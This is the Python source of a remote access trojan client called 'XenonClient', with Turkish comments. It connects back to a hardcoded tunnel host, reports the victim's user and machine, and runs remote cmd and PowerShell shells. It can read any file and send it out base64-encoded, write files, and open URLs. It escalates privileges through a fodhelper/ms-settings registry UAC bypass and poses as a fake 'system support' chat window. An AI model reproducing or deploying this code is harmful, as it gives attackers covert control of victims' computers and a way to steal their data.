import socket
import threading
import subprocess
import os
import platform
import json
import webbrowser
import time
import tkinter as tk
from tkinter import messagebox, scrolledtext
import winreg
import base64
import tempfile

# --- BAĞLANTI AYARLARI ---
HOST = "uwtd3ffva.localto.net" 
PORT = 6170
# -------------------------

class XenonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.chat_win = None
        self.chat_box = None
        self.chat_running = False
        self.cmd_process = None      # kalıcı CMD shell
        self.ps_process = None       # kalıcı PowerShell
        self.cmd_output_thread = None
        self.ps_output_thread = None
        self.cmd_lock = threading.Lock()
        self.ps_lock = threading.Lock()

    def get_sys_info(self):
        return json.dumps({
            "id": f"{os.getlogin()}@{platform.node()}",
            "country": "TR",
            "os": f"{platform.system()} {platform.release()}"
        })

    def uac_bypass(self, cmd_to_run):
        try:
            path = r"Software\Classes\ms-settings\Shell\Open\command"
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd_to_run)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
            return True
        except: return False

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                self.sock.send(self.get_sys_info().encode("utf-8"))
                self.listen()
            except: time.sleep(5)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(16384).decode("utf-8")
                if not data: break

                if data.startswith("msg|"):
                    threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|")[1])).start()

                elif data == "chat_open":
                    if not self.chat_running:
                        threading.Thread(target=self.gui_chat, daemon=True).start()

                elif data.startswith("chat_msg|"):
                    if self.chat_box:
                        try:
                            self.chat_box.config(state="normal")
                            self.chat_box.insert(tk.END, f"DESTEK: {data.split('|')[1]}\n")
                            self.chat_box.config(state="disabled"); self.chat_box.see(tk.END)
                        except: pass

                elif data == "chat_close":
                    if self.chat_win: 
                        self.chat_running = False
                        try: self.chat_win.quit() 
                        except: pass

                elif data == "beep":
                    if platform.system() == "Windows":
                        import winsound
                        winsound.Beep(800, 500)

                elif data.startswith("open_url|"):
                    webbrowser.open(data.split("|")[1])

                elif data.startswith("shell_cmd|"):   # kalıcı CMD komutu
                    cmd = data.split("|", 1)[1]
                    self.run_persistent_cmd(cmd, "cmd")
                
                elif data.startswith("ps_cmd|"):      # kalıcı PowerShell komutu
                    cmd = data.split("|", 1)[1]
                    self.run_persistent_cmd(cmd, "powershell")

                elif data.startswith("elevate|"):
                    target = "cmd.exe" if "cmd" in data else "powershell.exe"
                    self.uac_bypass(target)

                elif data.startswith("close_shell|"):
                    shell_type = data.split("|")[1]
                    self.close_shell(shell_type)

                elif data.startswith("playsound|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        filename = parts[1]
                        encoded = parts[2]
                        threading.Thread(target=self.play_audio, args=(filename, encoded), daemon=True).start()

                elif data.startswith("edit_file|"):
                    file_path = data.split("|", 1)[1]
                    threading.Thread(target=self.send_file_content, args=(file_path,), daemon=True).start()

                elif data.startswith("save_file|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        file_path = parts[1]
                        content_b64 = parts[2]
                        self.save_file_content(file_path, content_b64)

            except Exception as e:
                print(f"Listen hatası: {e}")
                break
        if self.sock: self.sock.close()

    def run_persistent_cmd(self, command, shell_type):
        """Kalıcı shell process'ine komut gönder ve çıktıyı oku."""
        def target():
            try:
                if shell_type == "cmd":
                    with self.cmd_lock:
                        if self.cmd_process is None:
                            # CMD shell başlat
                            self.cmd_process = subprocess.Popen(
                                ["cmd.exe"],
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                shell=True,
                                text=True,
                                bufsize=1
                            )
                            # Çıktı okuyucu thread başlat
                            self.cmd_output_thread = threading.Thread(target=self.read_cmd_output, daemon=True)
                            self.cmd_output_thread.start()
                        # Komutu yaz
                        self.cmd_process.stdin.write(command + "\n")
                        self.cmd_process.stdin.flush()
                elif shell_type == "powershell":
                    with self.ps_lock:
                        if self.ps_process is None:
                            self.ps_process = subprocess.Popen(
                                ["powershell.exe", "-NoExit", "-Command", "-"],
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                shell=True,
                                text=True,
                                bufsize=1
                            )
                            self.ps_output_thread = threading.Thread(target=self.read_ps_output, daemon=True)
                            self.ps_output_thread.start()
                        self.ps_process.stdin.write(command + "\n")
                        self.ps_process.stdin.flush()
            except Exception as e:
                self.sock.send(f"shell_res|Hata: {str(e)}\n".encode("utf-8"))
        threading.Thread(target=target, daemon=True).start()

    def read_cmd_output(self):
        """CMD çıktısını sürekli oku ve sunucuya gönder."""
        while self.cmd_process and self.cmd_process.poll() is None:
            try:
                line = self.cmd_process.stdout.readline()
                if line:
                    self.sock.send(f"shell_res|{line}".encode("utf-8", errors="replace"))
                else:
                    time.sleep(0.1)
            except:
                break

    def read_ps_output(self):
        """PowerShell çıktısını oku."""
        while self.ps_process and self.ps_process.poll() is None:
            try:
                line = self.ps_process.stdout.readline()
                if line:
                    self.sock.send(f"shell_res|{line}".encode("utf-8", errors="replace"))
                else:
                    time.sleep(0.1)
            except:
                break

    def close_shell(self, shell_type):
        """Shell process'ini kapat."""
        if shell_type == "cmd" and self.cmd_process:
            self.cmd_process.terminate()
            self.cmd_process = None
        elif shell_type == "powershell" and self.ps_process:
            self.ps_process.terminate()
            self.ps_process = None

    def send_file_content(self, file_path):
        """Dosya içeriğini oku, base64 encode et ve gönder."""
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            encoded = base64.b64encode(data).decode('utf-8')
            self.sock.send(f"file_content|{file_path}|{encoded}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_content|{file_path}|".encode("utf-8") + base64.b64encode(str(e).encode()).decode('utf-8').encode())

    def save_file_content(self, file_path, content_b64):
        """Base64 içeriği dosyaya yaz."""
        try:
            data = base64.b64decode(content_b64)
            with open(file_path, "wb") as f:
                f.write(data)
            # Başarılı mesajı gönderebiliriz ama opsiyonel
        except Exception as e:
            print(f"Dosya kaydedilemedi: {e}")

    def play_audio(self, filename, encoded):
        try:
            data = base64.b64decode(encoded)
            suffix = os.path.splitext(filename)[1]
            with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
                f.write(data)
                temp_path = f.name

            self.play_sound_file(temp_path, delete_after=True)
        except Exception as e:
            print(f"[!] Ses çalma hatası: {e}")

    def play_sound_file(self, file_path, delete_after=False):
        system = platform.system()
        try:
            import pygame
            pygame.mixer.init()
            pygame.mixer.music.load(file_path)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                time.sleep(0.1)
            pygame.mixer.quit()
            if delete_after:
                os.unlink(file_path)
        except ImportError:
            # pygame yoksa platforma özel
            if system == "Windows":
                if file_path.lower().endswith('.wav'):
                    import winsound
                    winsound.PlaySound(file_path, winsound.SND_FILENAME)
                    if delete_after:
                        os.unlink(file_path)
                else:
                    # MP3 vs. için varsayılan oynatıcıda aç
                    os.startfile(file_path)
                    # Ne zaman bittiğini bilemeyiz, 10 saniye sonra silmeyi dene
                    if delete_after:
                        threading.Timer(10, lambda: os.unlink(file_path)).start()
            elif system == "Linux":
                # aplay veya paplay ile oynat, bitince sil
                def play_and_remove():
                    os.system(f"aplay '{file_path}' 2>/dev/null || paplay '{file_path}'")
                    if delete_after:
                        os.unlink(file_path)
                threading.Thread(target=play_and_remove, daemon=True).start()
            elif system == "Darwin":
                def play_and_remove():
                    os.system(f"afplay '{file_path}'")
                    if delete_after:
                        os.unlink(file_path)
                threading.Thread(target=play_and_remove, daemon=True).start()
            else:
                print("Desteklenmeyen işletim sistemi")

    # Eski run_cmd fonksiyonunu kaldırabiliriz, artık kalıcı shell kullanıyoruz.
    # Ancak uyumluluk için eski komutlar da çalışsın istersen ekleyebiliriz.

    def gui_chat(self):
        self.chat_running = True
        self.chat_win = tk.Tk()
        self.chat_win.title("Sistem Destek")
        self.chat_win.geometry("350x450")
        self.chat_win.attributes("-topmost", True)
        
        self.chat_box = scrolledtext.ScrolledText(self.chat_win, state="disabled")
        self.chat_box.pack(expand=True, fill="both", padx=5, pady=5)
        
        ent = tk.Entry(self.chat_win)
        ent.pack(fill="x", padx=5, pady=5)

        def send_srv(e=None):
            m = ent.get()
            if m:
                self.chat_box.config(state="normal")
                self.chat_box.insert(tk.END, f"Siz: {m}\n")
                self.chat_box.config(state="disabled"); ent.delete(0, tk.END)
                try: self.sock.send(f"chat|{m}".encode("utf-8"))
                except: pass
        
        ent.bind("<Return>", send_srv)
        
        def on_closing():
            self.chat_running = False
            self.chat_win.destroy()
            self.chat_win = None
            self.chat_box = None
            
        self.chat_win.protocol("WM_DELETE_WINDOW", on_closing)
        
        self.chat_win.mainloop()
        self.chat_running = False
        self.chat_win = None

if __name__ == "__main__":
    XenonClient(HOST, PORT).connect()
